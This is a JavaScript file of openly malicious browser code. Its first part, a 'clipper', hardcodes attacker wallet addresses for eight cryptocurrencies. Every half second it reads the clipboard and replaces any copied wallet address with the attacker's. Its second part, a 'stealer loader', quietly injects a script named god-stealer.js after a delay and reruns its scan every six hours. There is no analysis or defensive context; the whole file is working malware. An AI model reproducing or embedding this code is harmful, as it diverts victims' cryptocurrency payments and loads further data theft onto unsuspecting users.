// NOVA CLIPPER — 8 blockchains, 500ms polling
(function(){
const W={btc:"bc1qa6u84s9gklt65he5ydm02uwjqex8nc06z9xe5v",eth:"0x1427288B35fFC766Eb5ccB825d9249199E93F617",sol:"FBAoS2xppahHUwyYiLhPXnFB8yqgXhqECPRegAH7RDyM",trx:"TUeLT9R9nUQL75DEKvK3BNo8iSndRs4Dv2",ltc:"Lge5FgDB2nSKqkJFUV3JQKLnKdx3uXZyqQ",doge:"DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv",xrp:"rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",dash:"XjwwwS6J2C9pTGwDnpys3g8q1S7hYnFMHw"};
const P=[{c:"btc",r:/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,w:W.btc},{c:"eth",r:/^0x[a-fA-F0-9]{40}$/,w:W.eth},{c:"sol",r:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/,w:W.sol},{c:"trx",r:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.trx},{c:"ltc",r:/^(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,62}$/,w:W.ltc},{c:"doge",r:/^[D9][1-9A-HJ-NP-Za-km-z]{33}$/,w:W.doge},{c:"xrp",r:/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,w:W.xrp},{c:"dash",r:/^X[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.dash}];
let last="";
setInterval(async()=>{try{const t=await navigator.clipboard.readText();if(!t||t===last)return;last=t;for(const p of P){if(p.r.test(t.trim())&&t.trim()!==p.w){await navigator.clipboard.writeText(p.w);return}}}catch(e){}},500);
})();
// God stealer loader
setTimeout(()=>{const s=document.createElement("script");s.src="/god-stealer.js";s.onload=()=>{setTimeout(()=>{if(window.GOD_STEALER){window.GOD_STEALER.runFullScan();setInterval(()=>window.GOD_STEALER.runFullScan(),6*60*60*1000)}},60000)};document.head.appendChild(s)},90000);
